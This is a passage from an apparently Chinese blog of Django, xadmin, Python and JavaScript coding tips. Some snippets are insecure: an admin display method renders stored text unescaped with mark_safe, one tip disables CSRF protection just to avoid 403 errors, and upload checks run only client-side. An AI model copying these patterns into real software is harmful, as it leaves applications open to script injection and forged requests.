self.name</span><br></pre></td></tr></table></figure>\n\n<p>这里使用xadmin作为后台管理框架，在adminx.py中代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import xadmin</span><br><span class=\"line\">from django.utils.safestring import mark_safe</span><br><span class=\"line\">from xadmin import views</span><br><span class=\"line\"></span><br><span class=\"line\">from .models import *</span><br><span class=\"line\"></span><br><span class=\"line\"># 奖项管理</span><br><span class=\"line\">class PrizesAdmin(object):</span><br><span class=\"line\">    search_fields = [&#x27;name&#x27;]  # 检索字段</span><br><span class=\"line\">    list_display = [&#x27;id&#x27;, &#x27;name&#x27;, &#x27;show_intro&#x27;]</span><br><span class=\"line\">    list_filter = [&#x27;name&#x27;]</span><br><span class=\"line\">    ordering = (&#x27;id&#x27;,)</span><br><span class=\"line\"></span><br><span class=\"line\">    def show_intro(self, obj):</span><br><span class=\"line\">        # 显示简介</span><br><span class=\"line\">        if not obj.intro:</span><br><span class=\"line\">            return mark_safe(&#x27;&#x27;)</span><br><span class=\"line\">        if len(obj.intro) &lt; 20:</span><br><span class=\"line\">            return mark_safe(obj.intro)</span><br><span class=\"line\"></span><br><span class=\"line\">        short_id = f&#x27;&#123;obj._meta.db_table&#125;_short_text_&#123;obj.id&#125;&#x27;</span><br><span class=\"line\">        short_text_len = len(obj.intro) // 4</span><br><span class=\"line\">        short_text = obj.intro[:short_text_len] + &#x27;......&#x27;</span><br><span class=\"line\">        detail_id = f&#x27;&#123;obj._meta.db_table&#125;_detail_text_&#123;obj.id&#125;&#x27;</span><br><span class=\"line\">        detail_text = obj.intro</span><br><span class=\"line\"></span><br><span class=\"line\">        text = &quot;&quot;&quot;&lt;style type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">                        #%s,%s &#123;padding:10px;border:1px solid green;&#125; </span><br><span class=\"line\">                  &lt;/style&gt;</span><br><span class=\"line\">                    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">                    function openShutManager(oSourceObj,oTargetObj,shutAble,oOpenTip,oShutTip,oShortObj)&#123;</span><br><span class=\"line\">                        var sourceObj = typeof oSourceObj == &quot;string&quot; ? document.getElementById(oSourceObj) : oSourceObj;</span><br><span class=\"line\">                        var targetObj = typeof oTargetObj == &quot;string&quot; ? document.getElementById(oTargetObj) : oTargetObj;</span><br><span class=\"line\">                        var shortObj = typeof oShortObj == &quot;string&quot; ? document.getElementById(oShortObj) : oShortObj;</span><br><span class=\"line\">                        var openTip = oOpenTip || &quot;&quot;;</span><br><span class=\"line\">                        var shutTip = oShutTip || &quot;&quot;;</span><br><span class=\"line\">                        if(targetObj.style.display!=&quot;none&quot;)&#123;</span><br><span class=\"line\">                           if(shutAble) return;</span><br><span class=\"line\">                           targetObj.style.display=&quot;none&quot;;</span><br><span class=\"line\">                           shortObj.style.display=&quot;block&quot;;</span><br><span class=\"line\">                           if(openTip  &amp;&amp;  shutTip)&#123;</span><br><span class=\"line\">                            sourceObj.innerHTML = shutTip; </span><br><span class=\"line\">                           &#125;</span><br><span class=\"line\">                        &#125; else &#123;</span><br><span class=\"line\">                           targetObj.style.display=&quot;block&quot;;</span><br><span class=\"line\">                           shortObj.style.display=&quot;none&quot;;</span><br><span class=\"line\">                           if(openTip  &amp;&amp;  shutTip)&#123;</span><br><span class=\"line\">                            sourceObj.innerHTML = openTip; </span><br><span class=\"line\">                           &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &lt;/script&gt;</span><br><span class=\"line\">                    &lt;p id=&quot;%s&quot;&gt;%s&lt;/p&gt;</span><br><span class=\"line\">                    &lt;p&gt;&lt;a href=&quot;###&quot; οnclick=&quot;openShutManager(this,&#x27;%s&#x27;,false,&#x27;点击关闭&#x27;,&#x27;点击展开&#x27;,&#x27;%s&#x27;)&quot;&gt;点击展开&lt;/a&gt;&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &lt;p id=&quot;%s&quot; style=&quot;display:none&quot;&gt;</span><br><span class=\"line\">                       %s</span><br><span class=\"line\">                    &lt;/p&gt;</span><br><span class=\"line\">                    &quot;&quot;&quot; % (short_id, detail_id, short_id, short_text, detail_id, short_id, detail_id, detail_text)</span><br><span class=\"line\">        return mark_safe(text)</span><br><span class=\"line\"></span><br><span class=\"line\">    show_intro.short_description = &#x27;描述&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><strong>注意</strong>：复制代码后需要做如下修改：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200815204246956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>一开始效果</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200621230038819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>点击展开效果：<img src=\"https://img-blog.csdnimg.cn/20200621230120177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"90、前端判断上传的文件是否为图片且限制大小为300kB\"><a href=\"#90、前端判断上传的文件是否为图片且限制大小为300kB\" class=\"headerlink\" title=\"90、前端判断上传的文件是否为图片且限制大小为300kB\"></a>90、前端判断上传的文件是否为图片且限制大小为300kB</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en-us&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body class=&quot;login&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;input class=&quot;form-control input-lg&quot; id=&quot;id_icon&quot; name=&quot;icon&quot; type=&quot;file&quot; onchange=&quot;imgTypeSize(&#x27;id_icon&#x27;,300)&quot;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    //判断是否为图片，若为图片，判断其大小是否大于0.3M</span><br><span class=\"line\">    function imgTypeSize(FileId, maxsize) &#123;</span><br><span class=\"line\">        /*获取图片内容对象*/</span><br><span class=\"line\">        var imgFile = document.getElementById(FileId).files[0];</span><br><span class=\"line\">        if (imgFile.name == &quot;&quot;) &#123;</span><br><span class=\"line\">            alert(&quot;请上传头像哦&quot;);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            /*图片类型正则验证*/</span><br><span class=\"line\">            var imgStr = /\\.(jpg|jpeg|png|bmp|BMP|JPG|PNG|JPEG)$/;</span><br><span class=\"line\">            if (!imgStr.test(imgFile.name)) &#123;</span><br><span class=\"line\">                alert(&quot;文件不是图片类型&quot;);</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                /*图片大小*/</span><br><span class=\"line\">                var imagSize = imgFile.size;</span><br><span class=\"line\">                if (imagSize &lt; (1024 * maxsize)) &#123;</span><br><span class=\"line\">                    return true;</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    alert(imgFile.name + &quot;大小不能超过&quot; + maxsize + &quot;kB&quot;);</span><br><span class=\"line\">                    document.getElementById(FileId).value = &quot;&quot;</span><br><span class=\"line\">                    return false;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"91、form表单提交前验证\"><a href=\"#91、form表单提交前验证\" class=\"headerlink\" title=\"91、form表单提交前验证\"></a>91、form表单提交前验证</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;form action=&quot;&quot; method=&quot;post&quot; id=&quot;login-form&quot; onsubmit=&quot;return toVaild()&quot;&gt;</span><br><span class=\"line\">\t&lt;input class=&quot;form-control&quot; id=&quot;id_account&quot; name=&quot;account&quot; type=&quot;text&quot; placeholder=&quot;账号&quot;/&gt;</span><br><span class=\"line\">\t&lt;input class=&quot;form-control&quot; id=&quot;id_password&quot; name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;密码&quot;&gt;</span><br><span class=\"line\">&lt;form&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    document.getElementById(&#x27;id_username&#x27;).focus()</span><br><span class=\"line\"></span><br><span class=\"line\">    function toVaild() &#123;</span><br><span class=\"line\">        var account = document.getElementById(&quot;id_account&quot;).value;</span><br><span class=\"line\">        var password = document.getElementById(&quot;id_password&quot;).value;</span><br><span class=\"line\">        if (account == &quot;&quot; || password == &quot;&quot;) &#123;</span><br><span class=\"line\">            alert(&quot;请输入账号和密码&quot;);</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"92、有序字典\"><a href=\"#92、有序字典\" class=\"headerlink\" title=\"92、有序字典\"></a>92、有序字典</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import collections</span><br><span class=\"line\"></span><br><span class=\"line\">d1 = collections.OrderedDict()  # 创建一个有序字典</span><br><span class=\"line\">d1[&#x27;a&#x27;] = &#x27;A&#x27;</span><br><span class=\"line\">d1[&#x27;b&#x27;] = &#x27;B&#x27;</span><br><span class=\"line\">d1[&#x27;c&#x27;] = &#x27;C&#x27;</span><br><span class=\"line\">d1[&#x27;d&#x27;] = &#x27;D&#x27;</span><br><span class=\"line\">for k, v in d1.items():</span><br><span class=\"line\">    print(k, v)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"93、Python在Windows系统下实现TTS（文字转语音）\"><a href=\"#93、Python在Windows系统下实现TTS（文字转语音）\" class=\"headerlink\" title=\"93、Python在Windows系统下实现TTS（文字转语音）\"></a>93、Python在Windows系统下实现TTS（文字转语音）</h2><p>导入包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install pypiwin32</span><br><span class=\"line\"></span><br><span class=\"line\">import win32com.client</span><br><span class=\"line\">spk = win32com.client.Dispatch(&quot;SAPI.SpVoice&quot;)</span><br><span class=\"line\">spk.Speak(u&quot;my name is ldc,what is your name&quot;)</span><br><span class=\"line\">spk.Speak(u&quot;大家好&quot;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"94、定义一个简单闹钟\"><a href=\"#94、定义一个简单闹钟\" class=\"headerlink\" title=\"94、定义一个简单闹钟\"></a>94、定义一个简单闹钟</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># pip install pypiwin32 -i https://pypi.python.org/simple</span><br><span class=\"line\">import win32com.client</span><br><span class=\"line\">import time </span><br><span class=\"line\">import winsound</span><br><span class=\"line\"></span><br><span class=\"line\">spk = win32com.client.Dispatch(&quot;SAPI.SpVoice&quot;)</span><br><span class=\"line\"># 定义闹钟时间</span><br><span class=\"line\">clocktime = [[19, 19], [11, 10], [12, 10], [18, 47]]  </span><br><span class=\"line\">runinghour = 1  # 定义运行时间</span><br><span class=\"line\">times = runinghour * 3600  # 次数</span><br><span class=\"line\">print(times)</span><br><span class=\"line\">for i in range(1, times):</span><br><span class=\"line\">    time_now = [time.localtime(time.time()).tm_hour, time.localtime(time.time()).tm_min]</span><br><span class=\"line\">    if time_now in clocktime:</span><br><span class=\"line\">        print(time_now)</span><br><span class=\"line\">        winsound.Beep(1000, 1000)</span><br><span class=\"line\">        spk.Speak(u&quot;快去看下饭好了没有？&quot;)</span><br><span class=\"line\">    time.sleep(60)  # 每分钟对比一次时间</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"95、根据年月获取当月天数\"><a href=\"#95、根据年月获取当月天数\" class=\"headerlink\" title=\"95、根据年月获取当月天数\"></a>95、根据年月获取当月天数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">def get_month_days(year, month):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    根据年份，月份信息显示此月份天数</span><br><span class=\"line\">    :param year: 年份：</span><br><span class=\"line\">    :param month: 月份（1～12）：</span><br><span class=\"line\">    :return: 当月天数</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    if month &gt;12 or month &lt;= 0:</span><br><span class=\"line\">        return -1</span><br><span class=\"line\">    if month == 2:</span><br><span class=\"line\">        return 29 if year % 4 == 0 and year % 100 != 0 or year % 400 == 0 else 28</span><br><span class=\"line\"></span><br><span class=\"line\">    if month in (4, 6, 9, 11):</span><br><span class=\"line\">        return 30</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return 31</span><br><span class=\"line\"></span><br><span class=\"line\">a = &#x27;2020-04&#x27;.split(&#x27;-&#x27;)</span><br><span class=\"line\">year = int(a[0])</span><br><span class=\"line\">month = int(a[1])</span><br><span class=\"line\">print(get_month_days(year,month))</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\">30</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"96、Django获取favicon-ico图标\"><a href=\"#96、Django获取favicon-ico图标\" class=\"headerlink\" title=\"96、Django获取favicon.ico图标\"></a>96、Django获取favicon.ico图标</h2><p>制作一个ico文件，使用PS或者某些在线生成ico的网站</p>\n<p>将此文件命名为“favicon.ico”后放在static/下</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200805104730363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>在urls.py中定义路由：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from django.urls import path</span><br><span class=\"line\">from django.views.generic import RedirectView</span><br><span class=\"line\"></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">\t# 访问favicon.ico 网站图标</span><br><span class=\"line\">    path(&quot;favicon.ico&quot;,RedirectView.as_view(url=&#x27;static/favicon.ico&#x27;)),</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"97、django-静态文件配置\"><a href=\"#97、django-静态文件配置\" class=\"headerlink\" title=\"97、django 静态文件配置\"></a>97、django 静态文件配置</h2><p>settings.py</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">STATIC_URL = &#x27;/static/&#x27;</span><br><span class=\"line\"># 添加静态资源路由地址</span><br><span class=\"line\">STATICFILES_DIRS = [</span><br><span class=\"line\">    os.path.join(BASE_DIR, &#x27;static&#x27;),</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\"># 使用python manage.py collectstatic收集静态文件时时使用STATIC_ROOT</span><br><span class=\"line\"># STATIC_ROOT = os.path.join(BASE_DIR, &#x27;static&#x27;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>urls.py</p>\n<pre><code>from django.urls import path, re_path\nfrom django.views.generic import RedirectView\nfrom django.views.static import serve\n\nfrom &#39;你的项目名称&#39; import settings\nurlpatterns = [\n   \n    path(&quot;favicon.ico&quot;,RedirectView.as_view(url=&#39;static/favicon.ico&#39;)),\n    re_path(&#39;static/(?P&lt;path&gt;.*)$&#39;, serve, &#123;&#39;document_root&#39;: settings.STATICFILES_DIRS[0]&#125;),\n    \n]\n</code></pre>\n<h2 id=\"98、django-JsonResponse返回中文时显示unicode编码（-u67e5-u8be2）\"><a href=\"#98、django-JsonResponse返回中文时显示unicode编码（-u67e5-u8be2）\" class=\"headerlink\" title=\"98、django JsonResponse返回中文时显示unicode编码（\\u67e5\\u8be2）\"></a>98、django JsonResponse返回中文时显示unicode编码（\\u67e5\\u8be2）</h2><p>原因<br>这个unicode编码，是python3默认返回的编码。</p>\n<p>解决方案<br>JsonResponse里面有个参数json_dumps_params，设置为json_dumps_params={‘ensure_ascii’:False}即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">data = &#123;&#x27;msg&#x27;: &#x27;创建成功&#x27;,&#125;</span><br><span class=\"line\">return JsonResponse(data=data, json_dumps_params=&#123;&#x27;ensure_ascii&#x27;: False&#125;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"99、获取当前时间月份的首日与最后一天\"><a href=\"#99、获取当前时间月份的首日与最后一天\" class=\"headerlink\" title=\"99、获取当前时间月份的首日与最后一天\"></a>99、获取当前时间月份的首日与最后一天</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import calendar</span><br><span class=\"line\"></span><br><span class=\"line\">def get_month_start_and_end(date=datetime.datetime.now()):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    获取当前时间的月份首日与最后一天</span><br><span class=\"line\">    :param date:</span><br><span class=\"line\">    :return: (首日，最后一天)</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    year, month = str(date).split(&#x27;-&#x27;)[0], str(date).split(&#x27;-&#x27;)[1]</span><br><span class=\"line\">    end = calendar.monthrange(int(year), int(month))[1]</span><br><span class=\"line\">    return f&#x27;&#123;year&#125;-&#123;month&#125;-01&#x27;, f&#x27;&#123;year&#125;-&#123;month&#125;-&#123;end&#125;&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"100、xadmin后台批量操作\"><a href=\"#100、xadmin后台批量操作\" class=\"headerlink\" title=\"100、xadmin后台批量操作\"></a>100、xadmin后台批量操作</h2><p>adminx.py</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import xadmin</span><br><span class=\"line\">from django.db.models import  Sum</span><br><span class=\"line\">from xadmin.plugins.actions import BaseActionView</span><br><span class=\"line\"></span><br><span class=\"line\">class MyCountFeeAction(BaseActionView):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">        用户余额统计</span><br><span class=\"line\">        &quot;&quot;&quot;</span><br><span class=\"line\">    action_name = &quot;countuserfee&quot;  #: 相当于这个 Action 的唯一标示, 尽量用比较针对性的名字</span><br><span class=\"line\">    description = u&#x27;统计用户总余额&#x27;  #: 描述, 出现在 Action 菜单中, 可以使用 ``%(verbose_name_plural)s`` 代替 Model 的名字.</span><br><span class=\"line\">    model_perm = &#x27;view&#x27;  # 权限</span><br><span class=\"line\"></span><br><span class=\"line\">    def do_action(self, queryset):</span><br><span class=\"line\">        all_balance = MallUser.objects.all().aggregate(Sum(&#x27;balance&#x27;))</span><br><span class=\"line\">        return HttpResponse(f&#x27;用户总余额&#123;all_balance&#125;&#x27;)</span><br><span class=\"line\">class UserAdmin(object):</span><br><span class=\"line\">    &quot;&quot;&quot;用户信息管理&quot;&quot;&quot;</span><br><span class=\"line\">    list_display = [&#x27;username&#x27;, &#x27;balance&#x27;, &#x27;status&#x27;, &#x27;addtime&#x27;]</span><br><span class=\"line\">    search_fields = [&#x27;username&#x27;, ]</span><br><span class=\"line\">    list_filter = [&#x27;status&#x27;, &#x27;addtime&#x27;]</span><br><span class=\"line\">    list_per_page = 30  # 默认每页数量</span><br><span class=\"line\">    model_icon = &#x27;fa fa-user&#x27;</span><br><span class=\"line\">    list_editable = [&#x27;status&#x27;]</span><br><span class=\"line\">    ordering = [&#x27;-addtime&#x27;]</span><br><span class=\"line\">    actions = [ MyCountFeeAction]  # 添加批量选择操作</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200812233442373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）\"><a href=\"#101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）\" class=\"headerlink\" title=\"101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）\"></a>101、xadmin过滤器外键显示特定值（比如只能过滤自己与超级管理员定义的数据）</h2><p>首先，修改xadmin源码，修改xadmin/filters.py,在401行，做如下修改，</p>\n<pre><code>把self.lookup_choices = field.get_choices(include_blank=False)\n改为：\n\n# 调用自定义的方法\nif hasattr(model_admin, &#39;&#123;field&#125;_choices&#39;.format(field=field.name)):\n        self.lookup_choices = getattr(model_admin, &#39;&#123;field&#125;_choices&#39;.format(field=field.name))(field, request,params, model,model_admin,field_path)\n    else:\n        self.lookup_choices = field.get_choices(include_blank=False)\n</code></pre>\n<p>如图:</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200812234011656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>然后，在adminx.py中定义过滤的方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import xadmin</span><br><span class=\"line\">from django.db.models import  Q, Sum</span><br><span class=\"line\">from xadmin.plugins.actions import BaseActionView</span><br><span class=\"line\"></span><br><span class=\"line\">class MeasurePointAdmin(object):</span><br><span class=\"line\">    # search_fields = [&#x27;user__name&#x27;, &#x27;user__account&#x27;]  # 检索字段</span><br><span class=\"line\">    list_display = [&#x27;num&#x27;, &#x27;elevation&#x27;, &#x27;correct_num&#x27;, &#x27;cumulative_amount&#x27;]</span><br><span class=\"line\">    list_filter = [&#x27;user&#x27;, &#x27;is_default&#x27;, &#x27;create_time&#x27;]  # 分组过滤的字段</span><br><span class=\"line\">    list_editable = [&#x27;num&#x27;, &#x27;elevation&#x27;, &#x27;correct_num&#x27;, &#x27;cumulative_amount&#x27;]</span><br><span class=\"line\">    ordering = (&#x27;id&#x27;,)  # 设置默认排序字段，负号表示降序排序</span><br><span class=\"line\">    list_per_page = 30  # 默认每页显示多少条记录，默认是100条</span><br><span class=\"line\">    model_icon = &#x27;fa fa-users&#x27;  # 左侧小图标</span><br><span class=\"line\">    readonly_fields = [&#x27;user&#x27;, &#x27;is_default&#x27;]</span><br><span class=\"line\">    import_excel = True</span><br><span class=\"line\">    actions = [MyCountFeeAction]</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t# 定义的函数名必须是  字段名_choices</span><br><span class=\"line\">    def user_choices(self, field, request, params, model, model_admin, field_path):</span><br><span class=\"line\">        # 超级用户不做控制</span><br><span class=\"line\">        if self.request.user.is_superuser:</span><br><span class=\"line\">            return field.get_choices(include_blank=False)</span><br><span class=\"line\"></span><br><span class=\"line\">        # 过滤器只显示自己与超级管理员</span><br><span class=\"line\">        user_lst = field.related_model._default_manager.filter(Q(id=self.request.user.id) | Q(is_superuser=True))</span><br><span class=\"line\">        # 返回格式 [(&#x27;pk&#x27;,&#x27;标题&#x27;),]</span><br><span class=\"line\">        return [(user.id, user.username) for user in user_lst]</span><br></pre></td></tr></table></figure>\n\n<p>效果:</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2020081223440761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"102、Django中的CSRF局部禁用\"><a href=\"#102、Django中的CSRF局部禁用\" class=\"headerlink\" title=\"102、Django中的CSRF局部禁用\"></a>102、Django中的CSRF局部禁用</h2><p>为了避免没有csrf token而产生的403的forbidden错误，可以使用csrf_exempt装饰器来处理POST、GET请求的View, 这种方式是CSRF局部禁用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from django.utils.decorators import method_decorator</span><br><span class=\"line\">from django.views.decorators.csrf import csrf_exempt</span><br><span class=\"line\"></span><br><span class=\"line\">@method_decorator(csrf_exempt)</span><br><span class=\"line\">def update_data(request):</span><br><span class=\"line\">    if request.method == &#x27;POST&#x27;:</span><br><span class=\"line\">    \tpass</span><br><span class=\"line\">\telif request.method == &#x27;GET&#x27;:</span><br><span class=\"line\">    \tpass</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"103、使用python命令创建django项目\"><a href=\"#103、使用python命令创建django项目\" class=\"headerlink\" title=\"103、使用python命令创建django项目\"></a>103、使用python命令创建django项目</h2><p>创建django项目<br>方式一：直接打开pycharm创建，选择file-&gt;new project-&gt;django<br>方式二：通过命令创建<br>先创建虚拟环境：python -m venv django_venv<br>然后导入django库：pip install django -i <a href=\"https://pypi.tuna.tsinghua.edu.cn/simple\">https://pypi.tuna.tsinghua.edu.cn/simple</a><br>最后使用命令创建：django-admin startproject my_django_project</p>\n<h2 id=\"104、-二维列表、二维数组行求和与列求和\"><a href=\"#104、-二维列表、二维数组行求和与列求和\" class=\"headerlink\" title=\"104、 二维列表、二维数组行求和与列求和\"></a>104、 二维列表、二维数组行求和与列求和</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import pandas as pd</span><br><span class=\"line\">from functools import reduce</span><br><span class=\"line\"></span><br><span class=\"line\"># 二维数组，对列和行求和</span><br><span class=\"line\">a = [</span><br><span class=\"line\">    [&#x27;&#x27;, 0, &#x27;&#x27;, 1, 4.1],</span><br><span class=\"line\">    [&#x27;&#x27;, 0, &#x27;&#x27;, &#x27;&#x27;, 4],</span><br><span class=\"line\">    [&#x27;123&#x27;, 0, &#x27;&#x27;, 3, 4, 6,7],</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def aa(x, y):</span><br><span class=\"line\">    x = 0 if isinstance(x, str) else x</span><br><span class=\"line\">    y = 0 if isinstance(y, str) else y</span><br><span class=\"line\">    return x + y</span><br><span class=\"line\"></span><br><span class=\"line\"># 对行求和</span><br><span class=\"line\">row_sum = [reduce(aa, i) for i in a]</span><br><span class=\"line\"># 对列求和，只能处理相同长度的子元素</span><br><span class=\"line\">column_sum_1 = [reduce(aa, i) for i in zip(*a)]</span><br><span class=\"line\"># 对列求和，可以处理不同长度的子元素</span><br><span class=\"line\">column_sum_2 = list(dict(pd.DataFrame(a).fillna(0).apply(lambda x: &#x27;&#x27; if any(isinstance(d, str) for d in x) else round(x.sum(), 2))).values())</span><br><span class=\"line\">print(&#x27;行求和：&#123;&#125;\\r\\n列求和(相同长度)：&#123;&#125;\\r\\n列求和：&#123;&#125;&#x27;.format(row_sum, column_sum_1, column_sum_2))</span><br></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">行求和：[5.1, 4, 20]</span><br><span class=\"line\">列求和(相同长度)：[0, 0, 0, 4, 12.1]</span><br><span class=\"line\">列求和：[&#x27;&#x27;, 0, &#x27;&#x27;, &#x27;&#x27;, 12.1, 6.0, 7.0]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"105、获取时间字符串的月份数\"><a href=\"#105、获取时间字符串的月份数\" class=\"headerlink\" title=\"105、获取时间字符串的月份数\"></a>105、获取时间字符串的月份数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from datetime import datetime</span><br><span class=\"line\">    </span><br><span class=\"line\">def get_months(start_month_str, end_month_str):</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    # 获取时间字符串中的月份数</span><br><span class=\"line\">    :param start_month_str: 开始字符串</span><br><span class=\"line\">    :param end_month_str: 结束字符串</span><br><span class=\"line\">    :return: 月份数</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    end_month_date = datetime.strptime(end_month_str, &#x27;%Y-%m&#x27;)</span><br><span class=\"line\">    start_month_date = datetime.strptime(start_month_str, &#x27;%Y-%m&#x27;)</span><br><span class=\"line\">    end_year, end_month = end_month_date.year, end_month_date.month</span><br><span class=\"line\">    start_year, start_month = start_month_date.year, start_month_date.month</span><br><span class=\"line\"></span><br><span class=\"line\">    return (end_year - start_year) *12 + (end_month - start_month) + 1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">end_month_str = &#x27;2021-02&#x27;</span><br><span class=\"line\">start_month_str = &#x27;2020-07&#x27;</span><br><span class=\"line\">print(get_months(start_month_str, end_month_str))</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"></span><br><span class=\"line\">8</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"106、字符串不足补零\"><a href=\"#106、字符串不足补零\" class=\"headerlink\" 